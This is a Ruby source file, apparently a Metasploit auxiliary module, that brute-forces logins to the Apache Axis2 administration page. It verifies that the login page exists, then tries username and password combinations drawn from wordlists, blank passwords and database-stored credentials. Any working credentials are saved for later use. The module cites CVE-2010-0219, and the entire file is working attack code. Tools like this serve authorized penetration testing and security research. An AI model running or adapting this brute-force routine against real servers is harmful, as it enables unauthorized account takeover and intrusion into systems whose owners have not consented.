##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/login_scanner/axis2'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner


  def initialize
    super(
      'Name'           => 'Apache Axis2 Brute Force Utility',
      'Description'    => %q{
        This module attempts to login to an Apache Axis2 instance using
        username and password combinations indicated by the USER_FILE,
        PASS_FILE, and USERPASS_FILE options. It has been verified to
        work on at least versions 1.4.1 and 1.6.2.
      },
      'Author'         =>
        [
          'Leandro Oliveira <leandrofernando[at]gmail.com>'
        ],
      'References'     =>
        [
          [ 'CVE', '2010-0219' ],
          [ 'OSVDB', '68662'],
        ],
      'License'        => MSF_LICENSE
    )

    register_options( [
      Opt::RPORT(8080),
      OptString.new('TARGETURI', [false, 'Path to the Apache Axis Administration page', '/axis2/axis2-admin/login']),
    ])
  end

  # For print_* methods
  def target_url
    "http://#{vhost}:#{rport}#{datastore['URI']}"
  end

  def run_host(ip)
    uri = normalize_uri(target_uri.path)

    print_status("Verifying login exists at #{target_url}")
    begin
      send_request_cgi({
        'method'  => 'GET',
        'uri'     => uri
      }, 20)
    rescue => e
      print_error("Failed to retrieve Axis2 login page at #{target_url}")
      print_error("Error: #{e.class}: #{e}")
      return
    end

    print_status "#{target_url} - Apache Axis - Attempting authentication"

    cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS'],
    )

    cred_collection = prepend_db_passwords(cred_collection)

    scanner = Metasploit::Framework::LoginScanner::Axis2.new(
      configure_http_login_scanner(
        uri: uri,
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5,
        http_username: datastore['HttpUsername'],
        http_password: datastore['HttpPassword']
      )
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id
      )
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)
        :next_user
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        if datastore['VERBOSE']
          print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
        end
        invalidate_login(credential_data)
        :abort
      when Metasploit::Model::Login::Status::INCORRECT
        if datastore['VERBOSE']
          print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
        end
        invalidate_login(credential_data)
      end
    end

  end



end
